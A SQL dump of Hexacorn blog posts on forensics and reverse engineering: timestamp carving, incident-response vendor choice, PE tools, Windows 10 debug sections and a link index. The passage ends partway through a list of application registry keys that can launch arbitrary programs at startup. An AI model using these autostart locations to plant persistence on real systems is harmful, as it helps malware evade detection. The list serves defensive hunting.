00:00:00,0040FA130F00CE01\r\n00000012,EPOCH   ,400001CE,2004-01-10 13:44:46,CE010040\r\n00000014,FILETIME,512FEF7F,2013-02-28 23:59:59,00408BB70F16CE01\r\n0000001C,FILETIME,5158CDFF,2013-03-31 23:59:59,008059DA6B2ECE01\r\n00000024,FILETIME,51805B00,2013-05-01 00:00:00,0000BED2FE45CE01\r\n00000026,EPOCH   ,45FED2BE,2007-03-19 18:13:18,BED2FE45\r\n0000002C,FILETIME,3DE3D068,2002-11-26 19:50:00,00A403018595C201\nThe first column is an offset, followed by the timestamp type, then hexadecimal EPOCH calculated from the data, then its YYYY-MM-DD hh:mm:ss representation and finally the actual bytes from the file that are converted to EPOCH.\nThe data is immediately more readable and certain conclusions can be drawn. If you look at the offsets, distance between them and type of timestamps you may actually ‘see through’ the data and potentially ‘define’ a reasonable structure.\nIn this particular case, we can see that FILETIME is\n00000004, 0000000C\n00000014, 0000001C\n00000024, 0000002C\n– looks like a sequence of FILETIME records. Following this logic, we can guess that structure of the file is potentially like this:\n00000000,DOSTIME ,44C257B0,2006-07-22 16:52:00,8086F634\r\n00000004,FILETIME,50B94880,2012-12-01 00:00:00,00C05DCE56CFCD01\r\n0000000C,FILETIME,510B0580,2013-02-01 00:00:00,0040FA130F00CE01\r\n00000014,FILETIME,512FEF7F,2013-02-28 23:59:59,00408BB70F16CE01\r\n0000001C,FILETIME,5158CDFF,2013-03-31 23:59:59,008059DA6B2ECE01\r\n00000024,FILETIME,51805B00,2013-05-01 00:00:00,0000BED2FE45CE01\r\n0000002C,FILETIME,3DE3D068,2002-11-26 19:50:00,00A403018595C201\nI can confirm it since it is one of the test files I created \nThe script can be found here.\nHappy craving & carving !\nBonus: if you look at the data in Registry, you will find more timestamps than you thought are actually there. This is a subject for another post \nUpdate\n\nBonus will be here faster than expected – turns out Andrew Case, Jerry Stormo, Joseph Sylve, and Vico Marziale wrote an awesome python script for timestamp carving in Registry\nShare this :)', 'File Formats ZOO, Forensic Analysis, Malware Analysis, Software Releases', 'http://www.hexacorn.com/blog/2015/08/22/craving-for-time-carve-some-timestamps-out-timecraver-v0-1/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (215, 'Permanent Link to Are you a Canon or Nikon?', 'Hexacorn', 'August 16, 2015 ', 'In a world of photographers there is a very common question exchanged between the peers which goes something along the lines of:\nAre you a Canon or a Nikon user?\nSometimes it goes beyond that and includes other brands: Fuji, Sony, Leica, etc., but the strong association with brand is err… a canon itself, at least in a photographic world.\nThe ability to love, or at least stick to one brand has benefits – you get really familiar with the brand, things fit, loyal customers can leverage the long-term relationship in many ways and sometimes it simply makes sense to be really good at one thing.\nThe world of security adapted this principle and applies it one by one to various security controls.\nThere are just a few of antivirus companies that matter and everyone can quickly associate themselves with one of them.\nThe very same goes for firewalls.\nAnd DLP solutions.\nAnd old-school forensics tools.\nEven sandboxes seem to be there already.\nEtc.\nIR solutions are IMHO still not there.\nThe differences between a good IR solution and a less-good IR solution are slowly emerging though.\nThese are for example:\n\nAbility to deploy and rapidly gain the best coverage within any organization, no matter what network topology they use\n\nWhoever can deploy faster and cover more quicker, wins\n\n\nAbility to fetch host’s volatile data is crucial\n\nWhoever does it in real-time does it better than sweepers\n\n\nAbility to fetch / monitor data from both kernel and userland\n\nWhoever can do it for both lands, is a winner\n\n\nAbility to sweep is still a very valuable add-on (they may detect campaigns AV doesn’t detect, web shells, etc.)\n\nWhoever offers both sweeps and real-time analysis, wins\n\n\nAbility to fetch data in the most forensically sound manner\n\nWhoever does it and ends up with the least contaminated host wins\n\n\nAbility to interact with the host’s volatile data (more precisely: with the actual object f.ex. processes)\n\nMalware removal is often as easy as killing the process and removing the file – whoever allows analysts to do it on the spot, wins (old school IR relies on psexec, help from a dedicated desktop/server team or even user to remove these and not uncommon is a full system rebuild)\n\n\nAbility to easily update\n\nWhoever does it in a way that is ‘invisible’ to everyone involved, wins\n\n\n\nMany of these are well-known and faced – for many years – by AV companies. Theirs are ones of the most prominent solutions deployed on endpoints today. It often boggles my mind that they have overslept the whole DFIR revolution that happened over last 5-10 years. It’s such a corporately-speaking “low-hanging-fruit”.\nAdding IR capability to AV product is such a no-brainer. Someone, please explain \nThis is still a time of experiments in IR world and there is no pool of shortlisted winners yet.\nIt is NOT wise to change IR vendors often now.\nLet these that are fighting for the market battle with each other, and winners will emerge.\nIf you have already purchased something from one vendor, do not rush on buying stuff from a new one.\nThe corporate world is currently divided into 4 IR buckets:\n\nthese who don’t know what they don’t know – these are destined to fail a.k.a. being epically pwned\nthese who know that they don’t know something – these are destined to fail, but at least are not surprised\nthese who know what they know – they may fail gracefully\nthese who know what they know, and potentially try to learn about the unknowns – a few lucky ones that have a (relatively) mature IR program implemented; they may still fail, but it will be a really graceful fail a.k.a. IR mission accomplished\n\nIf you see similarities with four stages of competence – this is not accidental.\nIgnorance in this industry is omnipresent and mind you – it includes yours truly. We are all firefighting a lot. The complexity of the IT Security is beyond a reach of a single individual, single vendor, single brand. Full stop. I think this is the world where the dry, theoretical certificates like CISSP/CISM meet the juicy, technical SANS exams. You use knowledge from CISSP/CISM (security controls & their management) and apply your technical knowledge (choose the best security controls & proper IR/forensics) from SANS courses to defensively ‘pwn’ your company internally.\nI guess it’s time to reveal the real purpose of this post.\nYou need many security controls. Choose one for each area that requires coverage, and stick to it. Do not flip them like burgers every 1/2/3 years. You want to invest once, deploy once, know it inside out and gain maximum coverage. The time to realistically deploy and fully understand each security control (to the level of ‘defensive pwnage’) is – in my personal opinion – 2-5 years. (there are many reasons for this taking so long: complicated network topology, legacy infrastructure, collisions/overlaps with other projects, ensuring business is affected in a minimal way, gradual deployment, staff changes, and then bugs, configuration issues, of the products themselves, etc. The other reason, especially for IR solutions is their immaturity. Many IR solutions are built in the garage, the only real field test they go through is when some company allows the IR vendor to put a foot in a door and give them access to the environment to test the waters. This is a real QA phase. If you are company doing the QA you will spend a lot of time troubleshooting. It’s ironic, because instead of being a customer, you are actually performing QA for the vendor. So, overall, it costs a lot of time and money to deploy ONE solution.\nThis is why I think the IR vendor change should be based not on budget or even merit, but on the coverage of the existing IR vendor (of course, if they suck, you need to change).\nOnly when you cover let’s say 98% of your endpoints – look at alternatives*.\n*In case you are wondering why – think of it this way: imagine you have a coverage of 98% with your current vendor (in a large corporate 98% coverage means there are still a lot of endpoints not covered- close to a few thousands, actually, but it’s a risk management, after all). Assuming the IR vendor you use is not some snake-oil company by the time you see this 98% coverage you may be quite sure that most of your endpoints are clean. Only then you should have a confidence to look for gains on the financial or even usability side, let alone whistles and fireworks that other vendors offer, because you know that you are going to deploy the new guy to the environment that is already 98% IR-managed.\nAt least, this is what I believe is true.\nShare this :)', 'Incident Response, Preaching', 'http://www.hexacorn.com/blog/2015/08/16/are-you-a-canon-or-nikon/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (216, 'Permanent Link to Two PE tools you might have never heard of. Now you do.', 'Hexacorn', 'August 15, 2015 ', 'There are tones of PE tools out there and lots of them are rehashing the very same ideas over and over again. It is easy to find numerous PE viewers, PE editors, PE dumpers, PE identification tools and so on and so forth. It is sad to see that many of them rarely reach quality and usability levels as the good-ol’ LordPE, PE Tools, or PEiD.\nStill, there are gems out there that are not very popular, yet it is really worth having them at hand during reverse engineering sessions.\nHere are two of them:\nExtensive File Dumper\nPretty much everyone heard of IDA Pro and Hex-Rays Decompiler.\nBut how many heard of Extensive File Dumper?\nThe tool is freely available online on the Hex-Rays web page.\nGo and grab it.\nIt is one of not so many dumping tools that supports crazy number of file formats – as per the Hex-Rays page:\nEXE, NE, LE, LX, PE, NLM, XCOFF, COFF, OMF, DBG, PRC, PEF, OS9, N64, PSX, EPOC, AR, AMIGA, ELF, ECOFF, HP SOM, GEOS, OLE2, AIF, AOF, AOUT, PE+, OMF166, MachO, XE/XBE, JPG, CIFF, TMOBJ, MRW, TIFF, MPG, CWLIB XCP.DAT, WMF, DSO, PDB\nNotably, this is one of not so many tools available on Windows platform that parses Mac executable files – anyone wanting to view the internal info of Mac executables typically uses ‘otool’ on Mac. Being able to view similar info on Windows is really handy.\nTo spice things up, it is a multiplatform tool and Hex-Rays distributes it in 3 versions (refer to folders win, mac, linux inside efd.zip)\nExample:\nefd.exe showing info on the efd (MAC version)\n\n\n\nDetect It Easy a.k.a. DIE\nThis is an awesome compiler/packer detector available on http://ntinfo.biz/.\nThe reason why it stands out?\nHere are a couple:\n\nThe author uses a dedicated signature engine to detect various types of files (not only PE)\nIt recognizes nearly 1000 file types\nPE detection is based not only on patterns, but also on more complex algorithms – it can not only determine that a file is compiled f.ex. with Microsoft Visual Studio – it also give you the most probable version of the compiler + some extra info, if available\n\n\n\nBonus: scripts are readable and you can view/modify algos (see db folder), or click Signatures button (after loading a file)\n\n\n\nBonus#2: The scripts can be debugged !\n\n\n\nIt shows entropy of the file in a graphical way\n\n\n\nAllows to copy snippets of data to clipboard in many ways + extract them as a binary\n\n\n\nPEiD is outdated and DIE is a nice alternative to have (you may also consider others f.ex. Exeinfo PE, RDG Packer Detector and ProtectionID)\n\nShare this :)', 'Forensic Analysis, Malware Analysis, Reversing', 'http://www.hexacorn.com/blog/2015/08/15/two-pe-tools-you-might-have-never-heard-of-now-you-do/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (217, 'Permanent Link to This post is for bots that rip content and publish it on their sites :)', 'Hexacorn', 'August 15, 2015 ', 'The words you read are ripped from hexacorn dot com.\nThe words you read are ripped from hexacorn dot com.\nThe words you read are ripped from hexacorn dot com.\nThe words you read are ripped from hexacorn dot com.\nThe words you read are ripped from hexacorn dot com.\nThe words you read are ripped from hexacorn dot com.\nThe words you read are ripped from hexacorn dot com.\nThe words you read are ripped from hexacorn dot com.\nShare this :)', 'Uncategorized', 'http://www.hexacorn.com/blog/2015/08/15/this-post-is-for-bots-that-rip-content-and-publish-it-on-their-sites/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (218, 'Permanent Link to Cryptarithms (sort of DFIR-related ;))', 'Hexacorn', 'August 15, 2015 ', 'Last year I was looking at my very old programs and I came across a cryptarithm solver that I wrote in khem… Pascal. I wrote it to solve one such riddle published in a crossword magazine back in a day (as a side note: when I found it I was actually looking for something completely different in a first place /as it is usually the case/).\nAs per wikipedia: cryptarithm or word addition, is a type of mathematical game consisting of a mathematical equation among unknown numbers, whose digits are represented by letters. The goal is to identify the value of each letter.\nSince I came across it I started wondering if there was a generic solution for this type of puzzle and after googling around I found out that it is possible – some people created dedicated web sites that handle all the solving work for you.\nUsing these available tools I created these 2 below so if you are bored, you can try to solve them  [as you can see it is DFIR-related  ]\n\nRCE+DFIR=ELEET\n\n         RCE\r\n      + DFIR\r\n       ----- \r\n     = ELEET\r\n\n\nMFT+FILE+FILE+FILE+FILE=NTFS\n\n          MFT\r\n       + FILE\r\n       + FILE\r\n       + FILE\r\n       + FILE\r\n       ------\r\n       = NTFS\r\n\nAnd if you struggle you can always cheat and use this solver by Naoyuki Tamura (that’s how I created these anyway  )\nShare this :)', 'Puzzles, Silly', 'http://www.hexacorn.com/blog/2015/08/15/cryptarithms-sort-of-dfir-related/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (219, 'Permanent Link to GCTL debug section in Windows 10 binaries', 'Hexacorn', 'July 30, 2015 ', 'Update\nRecently I got a message from Axel S. (Thanks!) who explains that:\nIt’s emitted by the linker in Visual Studio 2015 and later. The linker calls it “COFF group information” and you can prevent this directory from being emitted by specifying the additional linker option /nocoffgrpinfo.\nHe also provided a syntax for link.exe that can be used to dump the data from an executable:\nlink /dump /headers /coffgroup <file>\nThe below example is for Notepad.exe from Windows 10:\nPOGO Phase\n\n       RVA     Size  Name\n  -------- --------  ----\n  00001000      328  .rdata$brc\n  00001328        4  .CRT$XCA\n  0000132C        4  .CRT$XCAA\n  00001330       10  .CRT$XCU\n  00001340        4  .CRT$XCZ\n  00001344        4  .CRT$XIA\n  00001348        4  .CRT$XIAA\n  0000134C        4  .CRT$XIY\n  00001350        4  .CRT$XIZ\n  00001354      15C  .cfguard\n  000014B0     2FE0  .rdata\n  00004490        8  .rdata$sxdata\n  00004498       10  .rdata$zETW0\n  000044A8      3BB  .rdata$zETW1\n  00004863       38  .rdata$zETW2\n  0000489B        1  .rdata$zETW9\n  0000489C      2D0  .rdata$zzzdbg\n  00004B6C      1C6  .text\n  00004D32       6E  .text$di\n  00004DA0    16172  .text$mn\n  0001AF12       20  .text$x\n  0001AF32       76  .text$yd\n  0001AFA8       FC  .xdata$x\n  0001C000      180  .data$brc\n  0001C180      660  .data\n  0001C7E0     1EC4  .bss\n  0001F000      4B4  .idata$5\n  0001F4B4        4  .00cfg\n  0001F4B8      230  .idata$2\n  0001F6E8       14  .idata$3\n  0001F6FC      4B4  .idata$4\n  0001FBB0     14A4  .idata$6\n  00022000      530  .rsrc$01\n  00022530    197B0  .rsrc$02\n\nUpdate\nOkay, so after googling around I think I figured it out – the section is actually called LTCG (read it backwards  and is related to Link Time Code Generation and Profile Guided Optimization (PGO or pogo):\nLink Time Code Generation (AKA Whole Program Optimization) produces better code quality as we have additional whole program optimization to further optimize the code leveraging the bigger picture of the entire program that is only available during LTCG. LTCG is great for code quality, and it’s the foundation for Pogo; however throughput is its downside and developers today have to wait for full clean LTCG build times even on making trivial edits. This often kills the popularity of this feature and developers today are forced away to throw these extra performance improvements away in favor of productivity.\n– as explained here. Still don’t know what is a full meaning of the data, but hopefully structures are already documented somewhere.\nHere is how latest winedump ‘sees’ the file:\nDebug Table (2 directories)\r\nDirectory 01\r\n  Characteristics:   00000000\r\n  TimeDateStamp:     559F3C62 Fri Jul 10 11:30:42 2015\r\n  Version            0.00\r\n  Type:              2 (CODEVIEW)\r\n  SizeOfData:        37\r\n  AddressOfRawData:  000016A4\r\n  PointerToRawData:  00000AA4\r\n    CodeView Data\r\n      Signature:         RSDS\r\n      Guid:              {401da8a1-859a-4c87-a389-dbddda54527d}\r\n      Age:               00000001\r\n      Filename:          DirectDB.pdb\r\n\r\nDirectory 02\r\n  Characteristics:   00000000\r\n  TimeDateStamp:     559F3C62 Fri Jul 10 11:30:42 2015\r\n  Version            0.00\r\n  Type:              13 (POGO)\r\n  SizeOfData:        432\r\n  AddressOfRawData:  000016E0\r\n  PointerToRawData:  00000AE0\nOlder post\nWhile looking at the Windows 10 binaries I noticed it contains an extra debug section marked as ‘GCTL’. I don’t know what is the purpose of it and after asking on Twitter Reversing on Windows suggested it could be “Garbage Collection Table “.\nAny ideas?\nHere are some details from the 32-bit Windows:\nExample debug section from “\\Program Files\\Common Files\\System\\DirectDB.dll” as seen by Lord PE:\nand\n \nUpdate:\nThe type is 0xD – 13 –  the largest  IMAGE_DEBUG_TYPE_xxx constant I could find documented in SDK is 11 (IMAGE_DEBUG_TYPE_CLSID, but I came across the new types added to wine in May 2015:\nIMAGE_DEBUG_TYPE_VC_FEATURE    12\r\nIMAGE_DEBUG_TYPE_POGO          13 <-this is our guy\r\nIMAGE_DEBUG_TYPE_ILTCG         14\r\nIMAGE_DEBUG_TYPE_MPX           15\nOlder post\nThe hexadecimal dump of a part of the file storing 2 debug sections:\n        00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F   0123456789ABCDEF\r\n--------------------------------------------------------------------------------\r\n00AA0 : 30 60 00 00 52 53 44 53 A1 A8 1D 40 9A 85 87 4C   0`..RSDS...@...L 2720\r\n00AB0 : A3 89 DB DD DA 54 52 7D 01 00 00 00 44 69 72 65   .....TR}....Dire 2736\r\n00AC0 : 63 74 44 42 2E 70 64 62 00 00 00 00 00 00 00 00   ctDB.pdb........ 2752\r\n00AD0 : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................ 2768\r\n00AE0 : 47 43 54 4C 00 10 00 00 04 00 00 00 2E 43 52 54   GCTL.........CRT 2784\r\n00AF0 : 24 58 43 41 00 00 00 00 04 10 00 00 04 00 00 00   $XCA............ 2800\r\n00B00 : 2E 43 52 54 24 58 43 5A 00 00 00 00 08 10 00 00   .CRT$XCZ........ 2816\r\n00B10 : 04 00 00 00 2E 43 52 54 24 58 49 41 00 00 00 00   .....CRT$XIA.... 2832\r\n00B20 : 0C 10 00 00 04 00 00 00 2E 43 52 54 24 58 49 41   .........CRT$XIA 2848\r\n00B30 : 41 00 00 00 10 10 00 00 04 00 00 00 2E 43 52 54   A............CRT 2864\r\n00B40 : 24 58 49 5A 00 00 00 00 14 10 00 00 00 01 00 00   $XIZ............ 2880\r\n00B50 : 2E 67 66 69 64 73 24 78 00 00 00 00 20 11 00 00   .gfids$x.... ... 2896\r\n00B60 : 80 05 00 00 2E 72 64 61 74 61 00 00 A0 16 00 00   .....rdata...... 2912\r\n00B70 : 04 00 00 00 2E 72 64 61 74 61 24 73 78 64 61 74   .....rdata$sxdat 2928\r\n00B80 : 61 00 00 00 A4 16 00 00 EC 01 00 00 2E 72 64 61   a............rda 2944\r\n00B90 : 74 61 24 7A 7A 7A 64 62 67 00 00 00 90 18 00 00   ta$zzzdbg....... 2960\r\n00BA0 : 1E 4A 00 00 2E 74 65 78 74 24 6D 6E 00 00 00 00   .J...text$mn.... 2976\r\n00BB0 : B0 62 00 00 04 01 00 00 2E 78 64 61 74 61 24 78   .b.......xdata$x 2992\r\n00BC0 : 00 00 00 00 C0 63 00 00 6B 00 00 00 2E 65 64 61   .....c..k....eda 3008\r\n00BD0 : 74 61 00 00 00 70 00 00 20 00 00 00 2E 64 61 74   ta...p.. ....dat 3024\r\n00BE0 : 61 00 00 00 20 70 00 00 98 03 00 00 2E 62 73 73   a... p.......bss 3040\r\n00BF0 : 00 00 00 00 00 80 00 00 10 01 00 00 2E 69 64 61   .............ida 3056\r\n00C00 : 74 61 24 35 00 00 00 00 10 81 00 00 04 00 00 00   ta$5............ 3072\r\n00C10 : 2E 30 30 63 66 67 00 00 14 81 00 00 8C 00 00 00   .00cfg.......... 3088\r\n00C20 : 2E 69 64 61 74 61 24 32 00 00 00 00 A0 81 00 00   .idata$2........ 3104\r\n00C30 : 14 00 00 00 2E 69 64 61 74 61 24 33 00 00 00 00   .....idata$3.... 3120\r\n00C40 : B4 81 00 00 10 01 00 00 2E 69 64 61 74 61 24 34   .........idata$4 3136\r\n00C50 : 00 00 00 00 C4 82 00 00 90 04 00 00 2E 69 64 61   .............ida 3152\r\n00C60 : 74 61 24 36 00 00 00 00 00 90 00 00 58 00 00 00   ta$6........X... 3168\r\n00C70 : 2E 72 73 72 63 24 30 31 00 00 00 00 60 90 00 00   .rsrc$01....`... 3184\r\n00C80 : A8 03 00 00 2E 72 73 72 63 24 30 32 00 00 00 00   .....rsrc$02.... 3200\nStrings – they all look like section names:\n\nGCTL\n.CRT$XCA\n.CRT$XCZ\n.CRT$XIA\n.CRT$XIAA\n.CRT$XIZ\n.gfids$x\n.rdata\n.rdata$sxdata\n.rdata$zzzdbg\n.text$mn\n.xdata$x\n.edata\n.data\n.bss\n.idata$5\n.00cfg\n.idata$2\n.idata$3\n.idata$4\n.idata$6\n.rsrc$01\n.rsrc$02\n\nGlobal stats for all the section-like names extracted from all binaries on Windows 10 32-bit:\n6299 .rdata$zzzdbg\n6299 .rdata\n6268 .text$mn\n6266 .data\n6266 .00cfg\n6207 .rsrc$02\n6207 .rsrc$01\n6205 .idata$6\n6205 .idata$5\n6205 .idata$4\n6205 .idata$3\n6205 .idata$2\n6147 .bss\n5589 .xdata$x\n5589 .rdata$sxdata\n5481 .gfids$x\n5403 .CRT$XIZ\n5403 .CRT$XIA\n5403 .CRT$XCZ\n5403 .CRT$XCA\n5199 .CRT$XIAA\n4617 .edata\n3391 .text$yd\n3303 .text$di\n3251 .CRT$XCU\n3188 .text$x\n2882 .data$r\n1701 .didat$7\n1701 .didat$5\n1701 .didat$4\n1701 .didat$3\n1701 .didat$2\n1655 .didat$6\n1434 .CRT$XCL\n1229 .CRT$XIY\n1213 .rdata$zETW2\n1211 .text\n1166 .rdata$zETW1\n1164 .rdata$zETW9\n1164 .rdata$zETW0\n1135 .CRT$XCAA\n920 ATL$__z\n920 ATL$__a\n836 .rdata$r\n708 INIT\n646 ATL$__m\n636 minATL$__z\n636 minATL$__m\n636 minATL$__a\n612 PAGE\n604 .text$s\n497 .orpc\n487 PAGE$s\n380 minATL$__r\n352 .CRT$XCC\n310 .text$mn$00\n278 minATL$__f\n208 INIT$s\n196 .kmdfclassbind$d\n196 .kmdfclassbind$c\n196 .kmdfclassbind$a\n186 .CRT$XTZ\n186 .CRT$XTA\n186 .CRT$XPZ\n186 .CRT$XPA\n184 .CRT$XIC\n173 .kmdftypeinit$c\n173 .kmdftypeinit$a\n169 .tls$ZZZ\n169 .tls\n169 .rdata$T\n169 .CRT$XLZ\n169 .CRT$XLA\n128 .tls$\n97 .rtc$TZZ\n97 .rtc$TAA\n97 .rtc$IZZ\n97 .rtc$IAA\n96 .imrsiv\n75 .CRT$XPXA\n75 .CRT$XPX\n48 .text$mn$01\n47 .stls\n41 PAGER32C\n36 .kmdfclassbind$b\n36 .guids\n26 BID$A012\n24 BIDL$W023\n24 BIDL$W021\n24 BIDL$A023\n24 BIDL$A021\n24 BID$W103\n24 BID$W101\n24 BID$W093\n24 BID$W091\n24 BID$W083\n24 BID$W081\n24 BID$W073\n24 BID$W071\n24 BID$W063\n24 BID$W061\n24 BID$W053\n24 BID$W051\n24 BID$W043\n24 BID$W041\n24 BID$W033\n24 BID$W032\n24 BID$W031\n24 BID$W013\n24 BID$W011\n24 BID$A103\n24 BID$A101\n24 BID$A093\n24 BID$A091\n24 BID$A083\n24 BID$A081\n24 BID$A073\n24 BID$A071\n24 BID$A063\n24 BID$A061\n24 BID$A053\n24 BID$A051\n24 BID$A043\n24 BID$A041\n24 BID$A033\n24 BID$A031\n24 BID$A013\n24 BID$A011\n24 BID$A002\n24 BID$A001\n24 BID$A000\n23 PAGEDATA\n22 INITDATAZ\n20 PAGECONST\n19 PAGELK\n16 .wpp_sf\n14 BID$W052\n14 BID$W042\n14 .text$yc\n10 .CRT$XCBid\n8 INITCONST\n6 .no_bbt\n5 PAGELK$s\n4 RT_CONST\n4 PAGEWsk$s\n4 PAGEWsk\n4 PAGEDATAZ\n4 PAGECONS\n4 BID$W102\n4 BID$A032\n4 .mrdata\n3 PAGE_LK$s\n3 PAGE_LK\n3 PAGESRP0$s\n3 PAGESRP0\n3 PAGESER$s\n3 PAGESER\n3 PAGESENM$s\n3 PAGESENM\n3 PAGEPARWMI0\n3 PAGED\n3 .didat$8\n2 dseg\n2 cseg\n2 RT_DATA\n2 RT_BSS\n2 RTFOUT_PVTMETHODS\n2 PAGEwxcc\n2 PAGEwxc\n2 PAGEwxb\n2 PAGEwxa\n2 PAGEwx8\n2 PAGEwx7\n2 PAGEwx68\n2 PAGEwx2\n2 PAGEwx1\n2 PAGEWArp$s\n2 PAGEWArp\n2 PAGEVRFY\n2 PAGEUPDT\n2 PAGEUMDM$s\n2 PAGEUMDM\n2 PAGESSTP$s\n2 PAGESSTP\n2 PAGEPpoe$s\n2 PAGEPpoe\n2 PAGEPPTP$s\n2 PAGEPPTP\n2 PAGENWan$s\n2 PAGENWan\n2 PAGENDPx$s\n2 PAGENDPx\n2 PAGELOCK\n2 PAGEL2TP$s\n2 PAGEL2TP\n2 PAGEIRDA$s\n2 PAGEIRDA\n2 PAGEHrx$VsmData60467\n2 PAGEBTTS$s\n2 PAGEBTTS\n2 PAGEAVpn$s\n2 PAGEAVpn\n2 IPPCODE\n2 BID$W062\n2 BID$A102\n2 BID$A062\n2 ADUI$__z\n2 ADUI$__m\n2 ADUI$__a\n2 .text$wti\n2 .text$tii\n2 .text$src\n2 .text$cthunks\n2 .text$AFX_INIT\n2 .text$AFX_CORE4\n2 .text$AFX_CORE3\n2 .text$AFX_COL1\n2 .text$AFX_CMNCTL\n2 .text$AFX_AUX\n2 .rdata$VsmData\n2 .cht_data\n2 .chs_data\n2 .bootdata\n2 .RDFINIT$ZZZ\n2 .RDFINIT$\n2 .RDFINIT\n2 .MODINIT$ZZZ\n2 .MODINIT$\n2 .MODINIT\n2 .CRT$XCAM\n2 .CRT$XCAB\nShare this :)', 'Reversing, Windows 10', 'http://www.hexacorn.com/blog/2015/07/30/gctl-debug-section-in-windows-10-binaries/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (220, 'Permanent Link to Links to post series', 'Hexacorn', 'July 2, 2015 ', 'ximad pinged me asking if I can make some of the content more readable – I will think of it and perhaps convert some of this stuff into a PDF, but in the mean time providing a series of links for the ‘longer’ series on the blog\nDa Li’L World of DLL Exports and Entry Points\nDa Li’L World of DLL Exports and Entry Points, Part 1\nhttp://www.hexacorn.com/blog/2013/08/08/da-lil-world-of-dll-exports-and-entry-points-part-1/\nDa Li’L World of DLL Exports and Entry Points, Part 2\nhttp://www.hexacorn.com/blog/2013/08/11/da-lil-world-of-dll-exports-and-entry-points-part-2/\nDa Li’L World of DLL Exports and Entry Points, Part 3\nhttp://www.hexacorn.com/blog/2013/08/21/da-lil-world-of-dll-exports-and-entry-points-part-3/\nAnti-forensics\nThe shortest anti-forensics code in the world\nhttp://www.hexacorn.com/blog/2012/01/21/the-shortest-anti-forensics-code-in-the-world/\nThe shortest anti-forensics code in the world – take #2\nhttp://www.hexacorn.com/blog/2012/03/16/the-shortest-anti-forensics-code-in-the-world-take-2/\nPurple Haze – Anti-forensics and anti-detection\nhttp://www.hexacorn.com/blog/2012/02/13/purple-haze-anti-forensics-and-andi-detection/\nAnti-forensics – live examples\nhttp://www.hexacorn.com/blog/2012/02/18/anti-forensics-live-examples/\nAnti-forensics – live examples, Part 2\nhttp://www.hexacorn.com/blog/2014/06/27/anti-forensics-live-examples-part-2/\nAnti-forensics – live examples, Part 3\nhttp://www.hexacorn.com/blog/2014/08/29/anti-forensics-live-examples-part-3/\nEnter Sandbox Series\nEnter Sandbox – part 1: All APIs are equal, but some APIs are more equal than others\nhttp://www.hexacorn.com/blog/2015/05/29/enter-sandbox-part-1-all-api-are-equal-but-some-apis-are-more-equal-than-others/\nEnter Sandbox – part 2: COM, babe COM\nhttp://www.hexacorn.com/blog/2015/06/09/enter-sandbox-part-2-com-babe-com/\nEnter Sandbox – part 3: If you see Native code is creative\nhttp://www.hexacorn.com/blog/2015/06/10/enter-sandbox-part-3-if-you-see-native-code-is-creative/\nEnter Sandbox – part 4: In search for Deus Ex Machina\nhttp://www.hexacorn.com/blog/2015/06/12/enter-sandbox-part-4-in-search-for-deus-ex-machina/\nEnter Sandbox – part 5: In search for Deus Ex Machina II\nhttp://www.hexacorn.com/blog/2015/06/17/enter-sandbox-part-5-in-search-for-deus-ex-machina-ii/\nEnter Sandbox – part 6: The Nullsoft hypothesis and other installers&#039; conundrums\nhttp://www.hexacorn.com/blog/2015/06/26/enter-sandbox-part-6-the-nullsoft-hypothesis-and-other-installers-conundrums/\nEnter Sandbox – part 7: Hello, مرحبا, 您好, здравствуйте, γεια σας\nhttp://www.hexacorn.com/blog/2015/06/27/enter-sandbox-part-7-hello-%d9%85%d8%b1%d8%ad%d8%a8%d8%a7-%e6%82%a8%e5%a5%bd-%d0%b7%d0%b4%d1%80%d0%b0%d0%b2%d1%81%d1%82%d0%b2%d1%83%d0%b9%d1%82%d0%b5-%ce%b3%ce%b5%ce%b9%ce%b1-%cf%83/\nBeyond good ol’ Run key\nBeyond good ol’ Run key\n http://www.hexacorn.com/blog/2012/07/23/beyond-good-ol-run-key/\n\n A large number of different, more and less known mechanisms described – firts part of the series and as such, quite a big post\nICQ\n\nHKCU\\Software\\Mirabilis\\ICQ\\Agent\\Apps\n\n\nStandard apps that contain functionality / options to launch mandatory programs(P2P apps, etc.)\n‘Scanning’ files with AV when downloaded\nWindows Shell alternatives\nAutoStart when Scanner button is pressed\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\explorer\\AutoplayHandlers\\Handlers\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\StillImage\\Registered Applications\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\StillImage\\Events\\STIProxyEvent\n\n\nAutostart by re-using existing autostart entries\nAutostart via Plugins\nFile System infection\n\nBeyond good ol’ Run key, Part 2\nhttp://www.hexacorn.com/blog/2012/09/16/beyond-good-ol-run-key-part-2/\n\nFocused on standard apps that contain functionality / options to launch mandatory programs (Archivers, downloaders, Messengers, etc.) and the functionality is related to external viewers, AV scanners\n\nWinRar\n\nHKCU\\Software\\WinRAR\\Viewer\\ExternalViewer\nHKCU\\Software\\WinRAR\\VirusScan\\Name\n\n\nWinZip\n\nHKCU\\Software\\Nico Mak Computing\\WinZip\\programs\\zip2exe\nHKCU\\Software\\Nico Mak Computing\\WinZip\\programs\\viewer\nHKCU\\Software\\Nico Mak Computing\\WinZip\\programs\\vviewer\nHKCU\\Software\\Nico Mak Computing\\WinZip\\programs\\arc\nHKCU\\Software\\Nico Mak Computing\\WinZip\\programs\\arj\nHKCU\\Software\\Nico Mak Computing\\WinZip\\programs\\lha\nHKCU\\Software\\Nico Mak Computing\\WinZip\\programs\\scan\nHKCU\\Software\\Nico Mak Computing\\WinZip\\programs\\viewer\nHKCU\\Software\\Nico Mak Computing\\WinZip\\programs\\zip2exe\n\n\nInternet Download Manager\n\nHKCU\\Software\\DownloadManager\\VScannerProgram\n\n\nDownload Accelerator Plus (DAP)\n\nHKCU\\Software\\SpeedBit\\Download Accelerator\\AntiVirusEXE\n\n\n Orbit 